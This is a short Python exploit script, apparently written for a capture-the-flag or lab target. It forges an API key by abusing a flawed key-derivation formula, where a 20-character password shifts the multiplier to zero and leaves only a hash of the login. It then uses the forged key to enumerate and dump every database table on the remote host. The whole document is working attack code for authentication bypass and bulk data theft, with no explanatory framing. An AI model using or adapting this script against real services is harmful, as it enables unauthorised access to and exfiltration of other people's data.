import requests
import argparse
import json
import hashlib


parser = argparse.ArgumentParser()


def hash_sha256(data: str):
    return hashlib.sha256(data.encode()).hexdigest()

def generate_api_key(login: str, password: str):
    return hash_sha256(login + password * (len(login) >> len(password)))

def main():
    parser.add_argument('--host', type=str, required=True, help='Remote host (ip:port)')
    parser.add_argument('--login', type=str, required=True, help='User login')
    args = parser.parse_args()
    print('[*] Generating api key...')
    apikey = generate_api_key(args.login, "A"*20)
    
    r = requests.get("http://" + args.host + "/api/v1/dbs", params={"key": apikey})
    if r.status_code == 200:
        print('[*] API key is vulnearable: {}'.format(apikey))
    else:
        print('[!] Not vulnerable')
        exit()
    json_response = json.loads(r.text)

    print('[*] Dumping tables...')
    for db in json_response['data']:
        for table in db['tables']:
            r = requests.get("http://" + args.host + "/api/v1/", params={
                    'key': apikey, 
                    'db': db['db_name'],
                    'table': table['table_name']
                })
            json_response = json.loads(r.text)
            print("Table data: ", json_response)


if __name__ == "__main__":
    main()